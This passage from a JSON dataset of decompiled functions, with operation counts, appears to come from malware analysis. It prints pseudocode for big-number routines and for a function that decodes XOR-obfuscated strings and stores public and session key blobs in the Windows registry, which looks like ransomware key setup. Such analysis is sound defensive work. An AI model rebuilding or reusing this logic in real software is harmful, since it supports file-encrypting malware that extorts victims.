{\n      v11 = v46 - 1;\n      if ( v46 != 1 )\n      {\n        do\n        {\n          if ( v47[v11] )\n            break;\n          --v11;\n        }\n        while ( v11 );\n      }\n      v12 = v47[v11];\n      v13 = 0x80000000;\n      v14 = 0;\n      while ( (v12 & v13) == 0 )\n      {\n        v15 = v13 >> 1;\n        if ( (v12 & v15) != 0 )\n        {\n          ++v14;\n          break;\n        }\n        v16 = v15 >> 1;\n        if ( (v12 & v16) != 0 )\n        {\n          v14 += 2;\n          break;\n        }\n        v17 = v16 >> 1;\n        if ( (v12 & v17) != 0 )\n        {\n          v14 += 3;\n          break;\n        }\n        v14 += 4;\n        v13 = v17 >> 1;\n        if ( v14 >= 0x20 )\n          break;\n      }\n      v10 = 32 * (v11 + 1) - v14;\n    }\n    else\n    {\n      v10 = 0;\n    }\n    if ( v43 )\n    {\n      v19 = v43 - 1;\n      if ( v43 != 1 )\n      {\n        do\n        {\n          if ( *((_DWORD *)Block + v19) )\n            break;\n          --v19;\n        }\n        while ( v19 );\n      }\n      v20 = 0x80000000;\n      v21 = 0;\n      v22 = *((_DWORD *)Block + v19);\n      while ( (v22 & v20) == 0 )\n      {\n        v23 = v20 >> 1;\n        if ( (v22 & v23) != 0 )\n        {\n          ++v21;\n          break;\n        }\n        v24 = v23 >> 1;\n        if ( (v22 & v24) != 0 )\n        {\n          v21 += 2;\n          break;\n        }\n        v25 = v24 >> 1;\n        if ( (v22 & v25) != 0 )\n        {\n          v21 += 3;\n          break;\n        }\n        v21 += 4;\n        v20 = v25 >> 1;\n        if ( v21 >= 0x20 )\n          break;\n      }\n      v18 = 32 * (v19 + 1) - v21;\n    }\n    else\n    {\n      v18 = 0;\n    }\n    if ( v10 > v18 )\n      v47[v46 - 1] &= (1 << (v18 - 32 * (v46 - 1) - 1)) - 1;\n    v26 = v50++;\n    if ( v26 > 30 )\n      return -14;\n    v9 = a1;\n    if ( sub_403100(&v45, (int *)&v42) < 0 )\n    {\n      v48 = 1;\n      v32 = &v48;\n      v30 = 1;\n      v31 = 1;\n      if ( sub_403100(&v45, &v30) > 0 )\n      {\n        v7 = sub_403860(&v45, &v45, (int)&v39, (int)a1, (int)&v33);\n        if ( !v7 )\n        {\n          if ( !sub_403100(&v45, (int *)&v42) || !sub_4030C0(&v45, 1) )\n            goto LABEL_64;\n          v27 = 1;\n          if ( v51 > 1 )\n          {\n            while ( sub_403100(&v45, (int *)&v42) )\n            {\n              v7 = sub_405190(&v36, &v45, &v45);\n              if ( v7 )\n                goto LABEL_65;\n              v7 = sub_404FB0(&v45, &v36, a1);\n              if ( v7 )\n                goto LABEL_65;\n              v48 = 1;\n              v29[2] = (int)&v48;\n              v29[0] = 1;\n              v29[1] = 1;\n              if ( sub_403100(&v45, v29) )\n              {\n                if ( ++v27 < v51 )\n                  continue;\n              }\n              break;\n            }\n          }\n          if ( sub_403100(&v45, (int *)&v42) || !sub_4030C0(&v45, 1) )\n          {\n            v7 = -14;\n          }\n          else\n          {\nLABEL_64:\n            if ( ++v49 < a2 )\n              goto LABEL_14;\n          }\n        }\nLABEL_65:\n        v4 = v47;\n        v5 = v35;\n        goto LABEL_66;\n      }\n    }\n  }\n}\n\n"
    },
    {
        "Function": "sub_411790",
        "Total XOR and shift operations": 6,
        "XOR operations": 6,
        "Shift operations": 0,
        "Operation percentage": "1.73%",
        "Function Body": "\nint sub_411790()\n{\n  int i; // edi\n  unsigned int v1; // eax\n  LSTATUS v2; // esi\n  LSTATUS v3; // eax\n  unsigned int v4; // ecx\n  unsigned int v5; // ecx\n  unsigned int v6; // ecx\n  unsigned int v7; // ecx\n  char v8; // bl\n  int v9; // eax\n  char v10; // bh\n  int v11; // ecx\n  void *v12; // edi\n  size_t v13; // esi\n  int v14; // edx\n  int j; // ecx\n  int k; // eax\n  CHAR v17; // al\n  int v18; // edx\n  int m; // ecx\n  int n; // eax\n  CHAR v21; // al\n  LPSTR v22; // eax\n  char *v23; // ecx\n  __int128 v24; // xmm0\n  size_t v25; // eax\n  size_t v26; // esi\n  int v27; // eax\n  int v29[130]; // [esp+10h] [ebp-770h] BYREF\n  char v30[323]; // [esp+218h] [ebp-568h] BYREF\n  __int128 v31[32]; // [esp+35Bh] [ebp-425h] BYREF\n  char v32[6]; // [esp+55Bh] [ebp-225h] BYREF\n  _OWORD v33[23]; // [esp+561h] [ebp-21Fh] BYREF\n  int v34; // [esp+6D1h] [ebp-AFh]\n  int v35; // [esp+6D5h] [ebp-ABh]\n  int v36; // [esp+6D9h] [ebp-A7h]\n  char v37[15]; // [esp+6DDh] [ebp-A3h] BYREF\n  int v38[3]; // [esp+6ECh] [ebp-94h] BYREF\n  CHAR pszString[52]; // [esp+6F8h] [ebp-88h] BYREF\n  DWORD dwDisposition; // [esp+72Ch] [ebp-54h] BYREF\n  DWORD Type; // [esp+730h] [ebp-50h] BYREF\n  char v42[41]; // [esp+737h] [ebp-49h] BYREF\n  DWORD pcchString; // [esp+760h] [ebp-20h] BYREF\n  DWORD cbData; // [esp+764h] [ebp-1Ch] BYREF\n  HKEY phkResult; // [esp+768h] [ebp-18h] BYREF\n  char v46[8]; // [esp+76Eh] [ebp-12h] BYREF\n  _WORD v47[5]; // [esp+776h] [ebp-Ah] BYREF\n\n  *(_DWORD *)&v47[3] = malloc(0x483u);\n  for ( i = 0; ; i = 1 )\n  {\n    v1 = 0;\n    strcpy(&v42[19], \"\\x1BHT]OLZI^GWtxpYro\");\n    do\n    {\n      v42[v1 + 20] ^= v42[19];\n      ++v1;\n    }\n    while ( v1 < 0x10 );\n    v42[36] = 0;\n    if ( RegCreateKeyExA(HKEY_CURRENT_USER, &v42[20], 0, 0, 0, 0xF003Fu, 0, &phkResult, &dwDisposition) )\n    {\n      v5 = 0;\n      *(_OWORD *)&v42[13] = xmmword_4197A0;\n      strcpy(&v42[29], \"de+`nrx\");\n      do\n      {\n        v42[v5 + 14] ^= v42[13];\n        ++v5;\n      }\n      while ( v5 < 0x16 );\n      v42[36] = 0;\n      sub_4100C0(&v42[14]);\n      if ( sub_412270((char **)&v47[3]) )\n      {\n        *(_DWORD *)&v42[37] = 1155;\n        if ( sub_4120A0(*(char **)&v47[3], (int *)&v42[37]) )\n          goto LABEL_20;\n      }\n      return 0;\n    }\n    strcpy((char *)v47, \"=full\");\n    Type = 3;\n    cbData = 1280;\n    v2 = RegQueryValueExA(phkResult, (LPCSTR)v47 + 1, 0, &Type, Data, &cbData);\n    cbData = 259;\n    strcpy(v46, \"5Public\");\n    v3 = RegQueryValueExA(phkResult, &v46[1], 0, &Type, *(LPBYTE *)&v47[3], &cbData);\n    if ( !v2 && !v3 )\n    {\n      v4 = 0;\n      strcpy(v42, \"\\n*Mo~~cdm*yoyyced*aosy*lxeg*xomcy~xs\");\n      do\n        v42[++v4] ^= v42[0];\n      while ( v4 < 0x23 );\n      v42[36] = 0;\n      sub_4100C0(&v42[1]);\n      RegCloseKey(phkResult);\n      goto LABEL_20;\n    }\n    if ( dwDisposition != 2 || i )\n      break;\n    Sleep(0x2710u);\n  }\n  if ( !sub_412270((char **)&v47[3]) )\n    return 0;\n  *(_DWORD *)&v42[37] = 1155;\n  if ( !sub_4120A0(*(char **)&v47[3], (int *)&v42[37]) )\n    return 0;\n  strcpy((char *)v47, \"nfull\");\n  RegSetValueExA(phkResult, (LPCSTR)v47 + 1, 0, 3u, Data, 0x500u);\n  strcpy(v46, \"NPublic\");\n  RegSetValueExA(phkResult, &v46[1], 0, 3u, *(const BYTE **)&v47[3], 0x103u);\n  RegCloseKey(phkResult);\nLABEL_20:\n  sub_404760(&v37[3]);\n  sub_404760(v38);\n  sub_406A50(dword_41D220, 0, 0);\n  if ( sub_405360((int)&v37[3], *(void **)&v47[3], 0x100u)\n    || sub_405360((int)v38, (void *)(*(_DWORD *)&v47[3] + 256), 3u)\n    || sub_4069A0((int)dword_41D220, (int)&v37[3], 0, 0, 0, (int)v38) )\n  {\n    return 0;\n  }\n  sub_401970(v30);\n  sub_401610(v29);\n  v33[0] = xmmword_419080;\n  v6 = 0;\n  v34 = 319817738;\n  v33[1] = xmmword_419170;\n  v35 = 290460937;\n  v33[2] = xmmword_4190D0;\n  v36 = 269555472;\n  v33[3] = xmmword_4190F0;\n  strcpy(v37, \"QA\");\n  v33[4] = xmmword_4190B0;\n  v33[5] = xmmword_419090;\n  v33[6] = xmmword_419740;\n  v33[7] = xmmword_4190E0;\n  v33[8] = xmmword_4193F0;\n  v33[9] = xmmword_419440;\n  v33[10] = xmmword_419130;\n  v33[11] = xmmword_419750;\n  v33[12] = xmmword_419150;\n  v33[13] = xmmword_419290;\n  v33[14] = xmmword_4192B0;\n  v33[15] = xmmword_4191A0;\n  v33[16] = xmmword_419730;\n  v33[17] = xmmword_419190;\n  v33[18] = xmmword_419180;\n  v33[19] = xmmword_419020;\n  v33[20] = xmmword_419160;\n  v33[21] = xmmword_419210;\n  v33[22] = xmmword_419520;\n  do\n    *((_BYTE *)v33 + ++v6) ^= LOBYTE(v33[0]);\n  while ( v6 < 0x17D );\n  v7 = 0;\n  v31[0] = xmmword_4195F0;\n  v37[2] = 0;\n  v31[1] = xmmword_4199C0;\n  strcpy(v32, \"\\\\_RHI\");\n  v31[2] = xmmword_419990;\n  v31[3] = xmmword_4194E0;\n  v31[4] = xmmword_419530;\n  v31[5] = xmmword_4199B0;\n  v31[6] = xmmword_4192C0;\n  v31[7] = xmmword_419300;\n  v31[8] = xmmword_4191D0;\n  v31[9] = xmmword_4192D0;\n  v31[10] = xmmword_4196D0;\n  v31[11] = xmmword_4196F0;\n  v31[12] = xmmword_419710;\n  v31[13] = xmmword_419700;\n  v31[14] = xmmword_419760;\n  v31[15] = xmmword_4192F0;\n  v31[16] = xmmword_419680;\n  v31[17] = xmmword_4195B0;\n  v31[18] = xmmword_419650;\n  v31[19] = xmmword_4194F0;\n  v31[20] = xmmword_4196A0;\n  v31[21] = xmmword_419620;\n  v31[22] = xmmword_4196B0;\n  v31[23] = xmmword_419580;\n  v31[24] = xmmword_419540;\n  v31[25] = xmmword_419820;\n  v31[26] = xmmword_4196E0;\n  v31[27] = xmmword_4195A0;\n  v31[28] = xmmword_419560;\n  v31[29] = xmmword_419670;\n  v31[30] = xmmword_419600;\n  v31[31] = xmmword_4191C0;\n  do\n    *((_BYTE *)v31 + ++v7) ^= LOBYTE(v31[0]);\n  while ( v7 < 0x204 );\n  v8 = BYTE1(v33[0]);\n  v9 = 0;\n  v32[5] = 0;\n  if ( BYTE1(v33[0]) )\n  {\n    do\n      ++v9;\n    while ( *((_BYTE *)v33 + v9 + 1) );\n  }\n  v10 = BYTE1(v31[0]);\n  v11 = 0;\n  if ( BYTE1(v31[0]) )\n  {\n    do\n      ++v11;\n    while ( *((_BYTE *)v31 + v11 + 1) );\n  }\n  nNumberOfBytesToWrite = v11 + 500 + v9;\n  v12 = malloc(nNumberOfBytesToWrite);\n  lpBuffer = v12;\n  memset(v12, 0, nNumberOfBytesToWrite);\n  v13 = 0;\n  if ( v8 )\n  {\n    do\n      ++v13;\n    while ( *((_BYTE *)v33 + v13 + 1) );\n  }\n  memcpy(v12, (char *)v33 + 1, v13);\n  pcchString = 50;\n  if ( !CryptBinaryToStringA(Src, 8u, 4u, pszString, &pcchString) )\n    return 0;\n  v14 = 0;\n  for ( j = 0; ; ++j )\n  {\n    for ( k = 0; pszString[k]; ++k )\n      ;\n    if ( j >= k )\n      break;\n    v17 = pszString[j];\n    if ( v17 != 32 && v17 != 9 )\n      pszString[v14++] = v17;\n  }\n  pszString[v14] = 0;\n  *(_OWORD *)((char *)lpBuffer + v13) = *(_OWORD *)CharUpperA(pszString);\n  pcchString = 50;\n  if ( !CryptBinaryToStringA(*(const BYTE **)&v47[3], 8u, 4u, pszString, &pcchString) )\n    return 0;\n  v18 = 0;\n  for ( m = 0; ; ++m )\n  {\n    for ( n = 0; pszString[n]; ++n )\n      ;\n    if ( m >= n )\n      break;\n    v21 = pszString[m];\n    if ( v21 != 32 && v21 != 9 )\n      pszString[v18++] = v21;\n  }\n  pszString[v18] = 0;\n  v22 = CharUpperA(pszString);\n  v23 = (char *)lpBuffer;\n  v24 = *(_OWORD *)v22;\n  v25 = 0;\n  *(_OWORD *)((char *)lpBuffer + v13 + 16) = v24;\n  v26 = v13 + 32;\n  if ( v10 )\n  {\n    do\n      ++v25;\n    while ( *((_BYTE *)v31 + v25 + 1) );\n  }\n  memcpy(&v23[v26], (char *)v31 + 1, v25);\n  v27 = 0;\n  if ( v10 )\n  {\n    do\n      ++v27;\n    while ( *((_BYTE *)v31 + v27 + 1) );\n  }\n  nNumberOfBytesToWrite = v26 + v27;\n  free(*(void **)&v47[3]);\n  return 1;\n}\n// 419020: using guessed type __int128 xmmword_419020;\n// 419080: using guessed type __int128 xmmword_419080;\n// 419090: using guessed type __int128 xmmword_419090;\n// 4190B0: using guessed type __int128 xmmword_4190B0;\n// 4190D0: using guessed type __int128 xmmword_4190D0;\n// 4190E0: using guessed type __int128 xmmword_4190E0;\n// 4190F0: using guessed type __int128 xmmword_4190F0;\n// 419130: using guessed type __int128 xmmword_419130;\n// 419150: using guessed type __int128 xmmword_419150;\n// 419160: using guessed type __int128 xmmword_419160;\n// 419170: using guessed type __int128 xmmword_419170;\n// 419180: using guessed type __int128 xmmword_419180;\n// 419190: using guessed type __int128 xmmword_419190;\n// 4191A0: using guessed type __int128 xmmword_4191A0;\n// 4191C0: using guessed type __int128 xmmword_4191C0;\n// 4191D0: using guessed type __int128 xmmword_4191D0;\n// 419210: using guessed type __int128 xmmword_419210;\n// 419290: using guessed type __int128 xmmword_419290;\n// 4192B0: using guessed type __int128 xmmword_4192B0;\n// 4192C0: using guessed type __int128 xmmword_4192C0;\n// 4192D0: using guessed type __int128 xmmword_4192D0;\n// 4192F0: using guessed type __int128 xmmword_4192F0;\n// 419300: using guessed type __int128 xmmword_419300;\n// 4193F0: using guessed type __int128 xmmword_4193F0;\n// 419440: using guessed type __int128 xmmword_419440;\n// 4194E0: using guessed type __int128 xmmword_4194E0;\n// 4194F0: using guessed type __int128 xmmword_4194F0;\n// 419520: using guessed type __int128 xmmword_419520;\n// 419530: using guessed type __int128 xmmword_419530;\n// 419540: using guessed type __int128 xmmword_419540;\n// 419560: using guessed type __int128 xmmword_419560;\n// 419580: using guessed type __int128 xmmword_419580;\n// 4195A0: using guessed type __int128 xmmword_4195A0;\n// 4195B0: using guessed type __int128 xmmword_4195B0;\n// 4195F0: using guessed type __int128 xmmword_4195F0;\n// 419600: using guessed type __int128 xmmword_419600;\n// 419620: using guessed type __int128 xmmword_419620;\n// 419650: using guessed type __int128 xmmword_419650;\n// 419670: using guessed type __int128 xmmword_419670;\n// 419680: using guessed type __int128 xmmword_419680;\n// 4196A0: using guessed type __int128 xmmword_4196A0;\n// 4196B0: using guessed type __int128 xmmword_4196B0;\n// 4196D0: using guessed type __int128 xmmword_4196D0;\n// 4196E0: using guessed type __int128 xmmword_4196E0;\n// 4196F0: using guessed type __int128 xmmword_4196F0;\n// 419700: using guessed type __int128 xmmword_419700;\n// 419710: using guessed type __int128 xmmword_419710;\n// 419730: using guessed type __int128 xmmword_419730;\n// 419740: using guessed type __int128 xmmword_419740;\n// 419750: using guessed type __int128 xmmword_419750;\n// 419760: using guessed type __int128 xmmword_419760;\n// 4197A0: using guessed type __int128 xmmword_4197A0;\n// 419820: using guessed type __int128 xmmword_419820;\n// 419990: using guessed type __int128 xmmword_419990;\n// 4199B0: using guessed type __int128 xmmword_4199B0;\n// 4199C0: using guessed type __int128 xmmword_4199C0;\n// 41B000: using guessed type BYTE Src[256];\n// 41CA90: using guessed type BYTE Data[1280];\n// 41D220: using guessed type int dword_41D220[43];\n// 411790: using guessed type char var_568[323];\n// 411790: using guessed type int var_770[130];\n// 411790: using guessed type CHAR pszString[52];\n\n"
    }
]